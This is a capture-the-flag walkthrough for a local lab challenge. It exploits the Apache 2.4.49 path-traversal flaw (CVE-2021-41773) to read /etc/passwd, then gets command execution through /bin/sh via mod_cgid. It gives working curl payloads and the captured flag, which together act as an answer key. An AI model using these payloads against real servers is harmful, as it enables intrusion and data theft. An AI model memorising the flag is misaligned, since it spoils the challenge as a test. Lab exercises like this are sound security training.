# SOLUTION — birch (walkthrough, spoilers + flag)

Attack Drills series · `lfi/` · entry `http://127.0.0.1:18942`.
Commands assume the shot is armed and reachable on `127.0.0.1`
(`cp .env.example .env && docker compose up -d --build`). The flag value
below is the field-verified run's value, reproduced exactly as captured
(flags are public by policy; your own `FLAG` build arg will differ).

---

1. The root is just the stock Apache test page, but the version banner says
   **2.4.49** — the CVE-2021-41773 path-traversal version. Confirm traversal
   by reading a known file through the CGI alias with `.%2e` segments:

   ```bash
   curl -s --http0.9 --path-as-is \
        'http://127.0.0.1:18942/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
   ```

2. `mod_cgid` is loaded and `ScriptAlias /cgi-bin/` is active, so a
   traversed-out `/bin/sh` executed as a CGI runs commands. POST to the
   shell — body becomes its stdin:

   ```bash
   curl -s --data 'echo; id' \
        'http://127.0.0.1:18942/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
   ```

3. The upstream hint said *look at /tmp*. Read the flag:

   ```bash
   curl -s --data 'echo; cat /tmp/flag' \
        'http://127.0.0.1:18942/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
   ```

   ```
   FLAG{xbow_birch_2204898f6080929c97b954fb}}
   ```

> Field note: the CGI channel can come up half-alive right after a rebuild
> (HTTP answers, but `mod_cgid` hasn't finished warming — replies 403/503);
> a minute's patience or a force-recreate settles it. `RESET.sh` gates on
> this exact probe.

---


---

## Flag (field-verified run)

```
FLAG{xbow_birch_2204898f6080929c97b954fb}}
```

Location: container `/tmp/flag`.
